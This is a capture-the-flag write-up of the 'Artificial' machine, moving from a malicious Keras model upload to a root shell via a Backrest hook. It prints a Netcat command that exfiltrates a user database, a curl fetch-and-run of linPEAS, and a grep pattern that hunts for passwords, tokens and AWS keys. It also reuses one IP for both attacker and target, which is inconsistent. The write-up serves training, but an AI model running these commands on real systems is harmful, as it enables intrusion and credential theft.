# CTF – Artificial (Writeup)

## Context

In this challenge I face a web app that lets you upload machine learning models.  
The goal is to get initial access to the target machine, then escalate privileges up to **root**.

All sensitive information has been anonymized on purpose for public release.

---

## Recon

I start by identifying the services exposed on the target with a network scan:

    nmap -sC -sV -sS 10.10.11.74

The scan shows an exposed HTTP service and a web interface that accepts uploads of **.h5** files (Keras models).

---

## Initial access – Malicious model upload

The app accepts `.h5` models.  
I abuse this feature by generating a malicious model carrying a payload that runs server-side.

After the upload and once the app processes the model, the payload runs and I get a shell on the remote machine.

To stabilize the shell:

    script /dev/null -c bash

---

## Grabbing sensitive data

Exploring the system, I find a `.db` database holding user information, including **password hashes**.

I exfiltrate it to my machine with Netcat.

On my attacking machine:

    nc -lvnp 4445 > users.db

On the target:

    nc 10.10.11.74 4445 < ./users.db

Once I have the database, I identify a valid user and a password hash.

---

## Cracking the password and SSH access

I submit the hash to Crackstation.
Once the plaintext password is recovered, I can log in over SSH:

    ssh gael@10.10.11.74

---

## Local enumeration

After the SSH login, I keep enumerating locally to find privilege escalation vectors.

I use **linPEAS** to automate the enumeration.

On my machine:

    python3 -m http.server 8000

On the target:

    curl http://10.10.11.74:8000/linpeas.sh -o /tmp/linpeas.sh
    chmod +x /tmp/linpeas.sh
    /tmp/linpeas.sh

---

## Finding a sensitive service (Backrest)

The enumeration reveals an internal service called **Backrest**, along with its config files.

I search for secrets stored locally:

    grep -RniE "passw|secret|token|apikey|aws_|restic|backrest|pgpass|credential" . 2>/dev/null | head -n 50

In a config file (`config.json`) I find:
- an admin account (`backrest_root`)
- a password stored encrypted (bcrypt)

---

## Cracking the Backrest password

The recovered secret is encoded and encrypted.  
I extract it and crack it with **Hashcat** (bcrypt mode – 3200).

Once I recover the password, I have valid credentials for Backrest.

---

## Reaching Backrest through an SSH tunnel

Backrest is only reachable on the target's `localhost`.  
So I set up an SSH tunnel (local port forwarding):

    ssh -L 9898:127.0.0.1:9898 gael@10.10.11.74

I can then reach the Backrest interface from my machine at:

    http://localhost:9898

I authenticate with the credentials recovered earlier.

---

## Privilege escalation through Backrest

Backrest lets you configure **repositories** and **hooks** that run automatically on certain actions.

I abuse this by setting up a hook that runs a command leading to a reverse shell with elevated privileges.

On the attacker side:

    nc -lvnp 4444

Once the action fires on Backrest, the hook runs and I get a **root** shell on the target.

---

## Conclusion

This challenge shows:
- the risk of poorly controlled application file uploads,
- how dangerous internal services exposed only on localhost can be,
- the critical impact of poor secret management,
- the risk of hooks run by privileged services.

The exploitation combines an application attack, data exfiltration, password cracking and privilege escalation up to **root**.

---

## Skills demonstrated

- Network recon (Nmap)
- Application upload exploitation
- Reverse shell and stabilization
- File exfiltration (Netcat)
- Password cracking (hash / bcrypt)
- Local enumeration (linPEAS)
- SSH tunneling (port forwarding)
- Privilege escalation through an internal service
